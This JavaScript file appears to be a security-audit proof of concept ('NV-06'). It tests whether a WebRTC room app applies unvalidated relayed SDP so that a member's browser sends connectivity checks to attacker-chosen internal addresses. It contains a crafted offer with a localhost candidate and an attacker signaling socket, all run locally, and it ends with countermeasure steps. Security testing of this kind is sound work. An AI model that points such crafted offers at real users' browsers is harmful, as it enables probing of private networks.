// NV-06 (SDP/ICE LAN probing): does an unvalidated remote SDP make a member's
// browser dial attacker-chosen internal addresses? Path under test: a room
// member's RoomClient applies any signaling-relayed SDP as a remote
// description; the browser's ICE agent then sends connectivity checks (STUN
// binding requests) to every host candidate in that SDP — including
// internal IPs the attacker names.
//
// Setup (all local): a UDP listener plays the "controlled internal address";
// a real Chrome joins the room via a local preview server (workerd signaling);
// a Node socket plays the attacker and delivers a crafted offer whose only
// candidate is 127.0.0.1:<port>. If the listener receives a datagram, the
// browser probed the attacker-supplied address -> validated.
import { spawn } from "node:child_process";
import { createSocket } from "node:dgram";
import { chromium } from "playwright-core";
import { runId } from "./nv-common.mjs";

const PORT = "8798";
const BASE = `http://localhost:${PORT}`;
const PROBE_PORT = 55921;
const tag = runId();
const ROOM = `nvx06-${tag}`;

const FINGERPRINT =
  "AB:CD:EF:AB:CD:EF:AB:CD:EF:AB:CD:EF:AB:CD:EF:AB:CD:EF:AB:CD:EF:AB:CD:EF:AB:CD:EF:AB:CD:EF:AB:CD";
const ATTACKER_OFFER = {
  type: "offer",
  sdp:
    "v=0\r\n" +
    `o=- ${Date.now()} 2 IN IP4 127.0.0.1\r\n` +
    "s=-\r\nt=0 0\r\n" +
    "a=group:BUNDLE 0\r\n" +
    "m=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\n" +
    "c=IN IP4 0.0.0.0\r\n" +
    "a=ice-ufrag:nvuf\r\na=ice-pwd:nvpwdnvpwdnvpwdnvpwdnvpwd\r\n" +
    `a=fingerprint:sha-256 ${FINGERPRINT}\r\n` +
    "a=setup:actpass\r\na=mid:0\r\na=sctp-port:5000\r\n" +
    `a=candidate:1 1 udp 2130706431 127.0.0.1 ${PROBE_PORT} typ host\r\n`,
};

// 1) the controlled internal address
const probe = createSocket("udp4");
let probed = 0;
probe.on("message", () => probed++);
await new Promise((r) => probe.bind(PROBE_PORT, r));

// 2) local preview = real workerd signaling + the SPA
const server = spawn("pnpm", ["exec", "vp", "preview", "--port", PORT, "--strictPort"], {
  stdio: "ignore",
  detached: true,
});
const deadline = Date.now() + 30_000;
let up = false;
while (Date.now() < deadline && !up) {
  try {
    up = (await fetch(`${BASE}/healthz`)).ok;
  } catch {
    await new Promise((r) => setTimeout(r, 500));
  }
}
if (!up) {
  console.error("preview server did not start — run `vp build` first");
  process.exit(1);
}

// 3) the victim: a real browser joining the room through the app
const browser = await chromium.launch({
  headless: true,
  executablePath: "/usr/bin/google-chrome",
  args: [
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--disable-features=WebRtcHideLocalIpsWithMdns",
  ],
});
const page = await (await browser.newContext({ viewport: { width: 1280, height: 900 } })).newPage();
await page.goto(`${BASE}/r/${ROOM}`, { waitUntil: "domcontentloaded" });
await new Promise((r) => setTimeout(r, 4000)); // let the client connect + welcome
console.log("victim page loaded, attacker connecting...");

// 4) the attacker: a signaling socket that delivers the crafted offer.
//    Peer id sorts after every uuid char so the victim takes the polite role
//    and applies our offer directly instead of offering first.
const attackerWs = new WebSocket(
  `ws://localhost:${PORT}/ws?room=${ROOM}&peer=zznvattacker&name=nvattacker`,
);
let victimPeer = null;
let sent = false;
const victim = await new Promise((resolve, reject) => {
  const t = setTimeout(() => reject(new Error("no victim peer seen")), 20_000);
  attackerWs.onmessage = (ev) => {
    const msg = JSON.parse(String(ev.data));
    if (msg.t === "welcome") {
      victimPeer = msg.peers[0]?.peerId ?? null;
      if (victimPeer) {
        clearTimeout(t);
        resolve(victimPeer);
      }
    } else if (msg.t === "signal" && msg.data?.type === "answer") {
      // victim answered the crafted offer — checks are running now
    }
  };
});
attackerWs.send(JSON.stringify({ t: "signal", to: victim, data: ATTACKER_OFFER }));
sent = true;
console.log(`crafted offer delivered to victim ${victim} (candidate: 127.0.0.1:${PROBE_PORT})`);

// 5) verdict
const ok = await new Promise((resolve) => {
  const start = probed;
  const t = setInterval(() => {
    if (probed > start) {
      clearInterval(t);
      resolve(true);
    }
  }, 250);
  setTimeout(() => {
    clearInterval(t);
    resolve(false);
  }, 15_000);
});

console.log(
  ok
    ? `victim's browser sent ${probed} packet(s) to 127.0.0.1:${PROBE_PORT} — it dialed the attacker-supplied internal candidate`
    : `no packets reached 127.0.0.1:${PROBE_PORT} within 15s`,
);

await browser.close();
attackerWs.close?.();
try {
  process.kill(-server.pid, "SIGTERM");
} catch {}
probe.close();

console.log(
  ok
    ? `\nRESULT nv-06: VALIDATED — unvalidated SDP drives connectivity checks to` +
        ` attacker-chosen internal addresses. Owner step: repeat on the fleet's` +
        ` browsers (mDNS/policy variants). Countermeasure if warranted:` +
        ` candidate-address policy at the signaling sinks (follow-up ticket).`
    : `\nRESULT nv-06: not reproduced headless — owner step: two-tab` +
        ` webrtc-internals observation per the audit plan (headless Chrome may` +
        ` suppress checks real browsers perform).`,
);
process.exit(0);
